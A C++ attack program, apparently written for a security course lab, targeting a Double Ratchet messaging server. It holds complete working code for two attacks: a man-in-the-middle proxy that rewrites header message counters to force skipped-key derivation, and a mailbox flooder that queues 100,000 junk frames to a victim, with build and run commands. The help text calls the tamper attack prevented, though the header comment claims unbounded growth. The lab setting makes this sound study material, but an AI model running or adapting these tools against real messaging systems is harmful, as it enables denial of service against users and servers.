// attack0.cpp — Attack 0: Double Ratchet "skipped message key" resource exhaustion
// ---------------------------------------------------------------------------------
// Mallory sits between the server and Bob (see assignment scenario). Bob is told to
// connect to Mallory instead of the real server; Mallory forwards every byte to the
// real server EXCEPT that, in each delivered Frame, she rewrites the ratchet header's
// message-number field `n` to be far ahead of its real value.
//
// Why this is damaging (see protocol.md section 4.4):
//
//   def ratchet_decrypt(st, header, ct):
//       ...
//       skip_message_keys(st, header["n"])   // <-- runs BEFORE the AEAD check
//       mk, st.CKr = kdf_ck(st.CKr)
//       return aead_decrypt(mk, ct, st.AD + serialize(header))
//
//   def skip_message_keys(st, until):
//       if until - st.Nr > MAX_SKIP:         // MAX_SKIP = 1000
//           raise Error("too many skipped messages")
//       while st.Nr < until:
//           mk, st.CKr = kdf_ck(st.CKr)
//           st.skipped[(st.DHr, st.Nr)] = mk // <-- derived + STORED before auth
//           st.Nr += 1
//
// The receiver derives and *stores* up to MAX_SKIP message keys BEFORE the header is
// authenticated. The header is bound as associated data, so the final AEAD decrypt of
// our tampered frame fails — but the expensive key-derivation loop and the memory for
// up to 1000 stored keys have already happened. Because `st.skipped` persists across
// frames, each forged frame adds up to ~1000 HMAC derivations (CPU) and ~1000 keys
// (memory). Streaming forged frames drives Bob's CPU and RSS up without bound.
//
// We keep the gap <= MAX_SKIP per frame so the receiver does the maximum work instead
// of taking the cheap early `raise` path. The DH ratchet key `dh` is left untouched so
// decryption stays on the current receiving chain (no DH ratchet reset of Nr).
//
// Assumptions that make this work (document these in the report):
//   1. The header counters (`n`) travel in cleartext JSON and are reachable on-path.
//   2. The receiver advances/derives/stores skipped keys BEFORE verifying the AEAD tag,
//      so a forged header forces real work even though the frame never decrypts.
//   3. Skipped keys accumulate in `st.skipped` with no global cap (only a per-step cap).
//   4. We are on the Bob<->server path (the assignment's Mallory position).
//
// Build:   g++ -O2 -std=c++17 -o attack0 attack0.cpp -lpthread
// Run:     ./attack0 --listen 0.0.0.0:9100 --server as3_server:9000 --gap 1000
//          then start Bob pointed at Mallory:
//          docker compose run --rm bob /client --server-addr <mallory-ip> --port 9100
//
// NOTE: for authorized use against the provided lab environment only.

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <atomic>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <regex>
#include <string>
#include <thread>

namespace {

struct Opts {
    std::string listen_host = "0.0.0.0";
    int listen_port = 9100;
    std::string server_host = "as3_server";
    int server_port = 9000;
    long gap = 1000;  // how far ahead to push `n`; keep <= MAX_SKIP (1000) for max work

    // --flood-mailbox mode (the "another implementation flaw" from the brief):
    bool flood = false;        // if true, run mailbox flood instead of the MITM proxy
    std::string as_user = "evil";  // username we register as (server checks `from`)
    std::string target = "bob";    // recipient whose mailbox we fill
    long count = 100000;           // number of junk frames to enqueue
};

std::atomic<uint64_t> g_frames_tampered{0};

// Parse "host:port" into (host, port). Returns false on malformed input.
bool parse_hostport(const std::string& s, std::string& host, int& port) {
    auto pos = s.rfind(':');
    if (pos == std::string::npos) return false;
    host = s.substr(0, pos);
    try {
        port = std::stoi(s.substr(pos + 1));
    } catch (...) {
        return false;
    }
    return true;
}

int dial(const std::string& host, int port) {
    addrinfo hints{};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* res = nullptr;
    std::string port_s = std::to_string(port);
    if (getaddrinfo(host.c_str(), port_s.c_str(), &hints, &res) != 0 || !res) {
        return -1;
    }
    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }
    if (connect(fd, res->ai_addr, res->ai_addrlen) != 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);
    return fd;
}

int listen_on(const std::string& host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<uint16_t>(port));
    addr.sin_addr.s_addr = (host == "0.0.0.0") ? INADDR_ANY : inet_addr(host.c_str());
    if (bind(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) != 0) {
        close(fd);
        return -1;
    }
    if (::listen(fd, 16) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

// Rewrite the per-frame message number. Frames arrive as one-line JSON; the header
// shape is {"dh":"...","pn":<int>,"n":<int>,...}. A single poll response may carry
// MANY frames in one line ({"type":"frames","frames":[frame,frame,...]}), so we must
// rewrite EVERY frame's `n`, not just the first. We match the `n` that follows `pn`
// (so we never touch `pn` itself) and set it to its real value + gap. Keeping the gap
// <= MAX_SKIP makes the receiver take the expensive skip path rather than the cheap
// early `raise`.
std::string tamper_line(const std::string& line, long gap) {
    // Capture per frame: ("pn":<digits>,"n":)(<digits>)
    static const std::regex re(R"(("pn":\d+,"n":)(\d+))");
    auto begin = std::sregex_iterator(line.begin(), line.end(), re);
    auto end = std::sregex_iterator();
    if (begin == end) return line;  // no frame headers in this line

    std::string out;
    out.reserve(line.size() + 32);
    size_t last = 0;
    for (auto it = begin; it != end; ++it) {
        const std::smatch& m = *it;
        long real_n = 0;
        try {
            real_n = std::stol(m[2].str());
        } catch (...) {
            continue;
        }
        long new_n = real_n + gap;
        size_t digits_pos = static_cast<size_t>(m.position(2));
        out.append(line, last, digits_pos - last);  // text up to the digits
        out.append(std::to_string(new_n));           // rewritten value
        last = digits_pos + static_cast<size_t>(m.length(2));
        g_frames_tampered.fetch_add(1, std::memory_order_relaxed);
        std::cerr << "[mallory] tampered frame: n " << real_n << " -> " << new_n << "\n";
    }
    out.append(line, last, std::string::npos);  // trailing text
    return out;
}

// Server -> Bob direction: buffer bytes, split on '\n', rewrite frame lines, forward.
void pump_tamper(int from_fd, int to_fd, long gap) {
    std::string buf;
    char chunk[16384];
    for (;;) {
        ssize_t r = recv(from_fd, chunk, sizeof(chunk), 0);
        if (r <= 0) break;
        buf.append(chunk, static_cast<size_t>(r));
        size_t nl;
        while ((nl = buf.find('\n')) != std::string::npos) {
            std::string line = buf.substr(0, nl);
            buf.erase(0, nl + 1);
            std::string out = tamper_line(line, gap);
            out.push_back('\n');
            if (send(to_fd, out.data(), out.size(), 0) < 0) return;
        }
    }
    shutdown(to_fd, SHUT_WR);
}

// Bob -> server direction: forward untouched (requests must stay valid).
void pump_plain(int from_fd, int to_fd) {
    char chunk[16384];
    for (;;) {
        ssize_t r = recv(from_fd, chunk, sizeof(chunk), 0);
        if (r <= 0) break;
        if (send(to_fd, chunk, static_cast<size_t>(r), 0) < 0) break;
    }
    shutdown(to_fd, SHUT_WR);
}

void handle_client(int bob_fd, Opts opts) {
    int srv_fd = dial(opts.server_host, opts.server_port);
    if (srv_fd < 0) {
        std::cerr << "[mallory] cannot reach real server\n";
        close(bob_fd);
        return;
    }
    std::thread t1(pump_tamper, srv_fd, bob_fd, opts.gap);  // server -> Bob (tamper)
    std::thread t2(pump_plain, bob_fd, srv_fd);             // Bob -> server (verbatim)
    t1.join();
    t2.join();
    close(srv_fd);
    close(bob_fd);
    std::cerr << "[mallory] connection closed (frames tampered so far: "
              << g_frames_tampered.load() << ")\n";
}

// --flood-mailbox mode: register as `as_user`, then enqueue `count` junk frames to
// `target`. The server rejects a spoofed `from` (we observed {"err":"bad sender"}), so
// we register first; after that there is no per-mailbox quota or rate limit, and the
// recipient's queue — hence server memory — grows without bound. The frames carry a
// bogus ratchet pubkey and random ciphertext; the victim rejects each cheaply on poll,
// but the queue itself is the DoS.
int flood_mailbox(const Opts& o) {
    int fd = dial(o.server_host, o.server_port);
    if (fd < 0) {
        std::cerr << "[flood] cannot reach server " << o.server_host << ":"
                  << o.server_port << "\n";
        return 1;
    }
    // register so `from` passes the server's sender check
    std::string reg = "{\"type\":\"register\",\"user\":\"" + o.as_user + "\"}\n";
    if (send(fd, reg.data(), reg.size(), 0) < 0) {
        std::cerr << "[flood] register send failed\n";
        close(fd);
        return 1;
    }
    char ack[512];
    recv(fd, ack, sizeof(ack), 0);  // best-effort read of the register ack

    // A fixed junk frame: bogus 32-byte dh (b64 of 0x11*32), 48-byte ct (b64 of zeros).
    const std::string dh_b64 = "ERERERERERERERERERERERERERERERERERERERERERE=";  // 0x11*32
    const std::string ct_b64 =
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  // zeros
    std::string frame = "{\"type\":\"send\",\"frame\":{\"from\":\"" + o.as_user +
                        "\",\"to\":\"" + o.target +
                        "\",\"header\":{\"dh\":\"" + dh_b64 +
                        "\",\"pn\":0,\"n\":0},\"ct\":\"" + ct_b64 + "\"}}\n";

    std::cerr << "[flood] registered as " << o.as_user << "; enqueuing " << o.count
              << " frames to " << o.target << " ...\n";
    char drain[65536];
    for (long i = 0; i < o.count; ++i) {
        if (send(fd, frame.data(), frame.size(), 0) < 0) {
            std::cerr << "[flood] send failed after " << i << " frames\n";
            close(fd);
            return 1;
        }
        // Drain the server's per-send "ok" replies without blocking; otherwise the
        // socket back-pressures once both buffers fill and the flood stalls.
        if ((i & 0x3FF) == 0) {
            while (recv(fd, drain, sizeof(drain), MSG_DONTWAIT) > 0) {
            }
        }
    }
    std::cerr << "[flood] done: " << o.count << " frames queued in " << o.target
              << "'s mailbox (no quota / no rate limit enforced)\n";
    close(fd);
    return 0;
}

Opts parse_args(int argc, char** argv) {
    Opts o;
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        auto next = [&](const char* name) -> std::string {
            if (i + 1 >= argc) {
                std::cerr << "missing value for " << name << "\n";
                std::exit(2);
            }
            return argv[++i];
        };
        if (a == "--listen") {
            parse_hostport(next("--listen"), o.listen_host, o.listen_port);
        } else if (a == "--server") {
            parse_hostport(next("--server"), o.server_host, o.server_port);
        } else if (a == "--gap") {
            o.gap = std::stol(next("--gap"));
        } else if (a == "--flood-mailbox") {
            o.flood = true;
        } else if (a == "--as") {
            o.as_user = next("--as");
        } else if (a == "--target") {
            o.target = next("--target");
        } else if (a == "--count") {
            o.count = std::stol(next("--count"));
        } else if (a == "-h" || a == "--help") {
            std::cout
                << "usage:\n"
                << "  MITM counter tamper (shown to be PREVENTED by header auth):\n"
                << "    attack0 --listen H:P --server H:P --gap N\n"
                << "  mailbox flood (the real availability flaw):\n"
                << "    attack0 --flood-mailbox --server H:P --as USER --target USER "
                   "--count N\n";
            std::exit(0);
        }
    }
    return o;
}

}  // namespace

int main(int argc, char** argv) {
    Opts opts = parse_args(argc, argv);
    if (opts.flood) {
        return flood_mailbox(opts);
    }
    int lfd = listen_on(opts.listen_host, opts.listen_port);
    if (lfd < 0) {
        std::cerr << "cannot listen on " << opts.listen_host << ":" << opts.listen_port
                  << "\n";
        return 1;
    }
    std::cerr << "[mallory] MITM up on " << opts.listen_host << ":" << opts.listen_port
              << " -> " << opts.server_host << ":" << opts.server_port
              << " (gap=" << opts.gap << ")\n";
    for (;;) {
        int cfd = accept(lfd, nullptr, nullptr);
        if (cfd < 0) continue;
        std::thread(handle_client, cfd, opts).detach();
    }
}
